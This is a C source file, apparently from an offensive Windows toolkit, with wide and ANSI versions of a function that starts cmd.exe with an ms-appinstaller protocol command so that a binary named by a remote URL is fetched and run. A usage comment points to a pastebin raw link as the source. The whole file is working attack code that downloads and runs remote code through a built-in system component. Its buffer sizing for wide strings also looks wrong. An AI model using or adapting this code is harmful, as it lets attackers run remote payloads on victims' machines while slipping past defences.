#include "Win32Helper.h"

BOOL MpfLolExecuteRemoteBinaryByAppInstallerW(_In_ PWCHAR RemoteUrlTextFile, _In_ DWORD RemoteUrlLengthInBytes)
{
	//		Usage: MpfLolExecuteRemoteBinaryByAppInstallerW((PWCHAR)L"https://pastebin.com/raw/tdyShwLw", 34);
	//		NOTE: Will display an error stating MS-APPINSTALLER PROTOCOL IS DISABLED
	//		it must be enabled...

	SHELLEXECUTEINFOW Info = { 0 };
	PWCHAR Payload = NULL;
	WCHAR CmdPath[28] = L"C:\\Windows\\System32\\cmd.exe";
	DWORD dwPayloadLength = ERROR_SUCCESS;
	BOOL bFlag = FALSE;
	
	Info.cbSize = sizeof(SHELLEXECUTEINFOW);
	Info.lpVerb = L"open";
	Info.nShow = SW_SHOW;
	Info.lpFile = CmdPath;

	dwPayloadLength = 36;
	dwPayloadLength += RemoteUrlLengthInBytes;

	Payload = (PWCHAR)HeapAlloc(GetProcessHeapFromTeb(), HEAP_ZERO_MEMORY, dwPayloadLength);
	if (Payload == NULL)
		return FALSE;

	if (StringCopyW(Payload, (PWCHAR)L"/c start ms-appinstaller://?source=") == NULL)
		goto EXIT_ROUTINE;

	if (StringConcatW(Payload, RemoteUrlTextFile) == NULL)
		goto EXIT_ROUTINE;

	Info.lpParameters = Payload;

	bFlag = ShellExecuteExW(&Info);
	
EXIT_ROUTINE:

	if (Payload)
		HeapFree(GetProcessHeapFromTeb(), HEAP_ZERO_MEMORY, Payload);

	return bFlag;
}

BOOL MpfLolExecuteRemoteBinaryByAppInstallerA(_In_ PCHAR RemoteUrlTextFile, _In_ DWORD RemoteUrlLengthInBytes)
{
	//		Usage: MpfLolExecuteRemoteBinaryByAppInstallerW((PWCHAR)L"https://pastebin.com/raw/tdyShwLw", 34);
	//		NOTE: Will display an error stating MS-APPINSTALLER PROTOCOL IS DISABLED
	//		it must be enabled...

	SHELLEXECUTEINFOA Info = { 0 };
	PCHAR Payload = NULL;
	CHAR CmdPath[28] = "C:\\Windows\\System32\\cmd.exe";
	DWORD dwPayloadLength = ERROR_SUCCESS;
	BOOL bFlag = FALSE;

	Info.cbSize = sizeof(SHELLEXECUTEINFOA);
	Info.lpVerb = "open";
	Info.nShow = SW_SHOW;
	Info.lpFile = CmdPath;

	dwPayloadLength = 36;
	dwPayloadLength += RemoteUrlLengthInBytes;

	Payload = (PCHAR)HeapAlloc(GetProcessHeapFromTeb(), HEAP_ZERO_MEMORY, dwPayloadLength);
	if (Payload == NULL)
		return FALSE;

	if (StringCopyA(Payload, (PCHAR)"/c start ms-appinstaller://?source=") == NULL)
		goto EXIT_ROUTINE;

	if (StringConcatA(Payload, RemoteUrlTextFile) == NULL)
		goto EXIT_ROUTINE;

	Info.lpParameters = Payload;

	bFlag = ShellExecuteExA(&Info);

EXIT_ROUTINE:

	if (Payload)
		HeapFree(GetProcessHeapFromTeb(), HEAP_ZERO_MEMORY, Payload);

	return bFlag;
}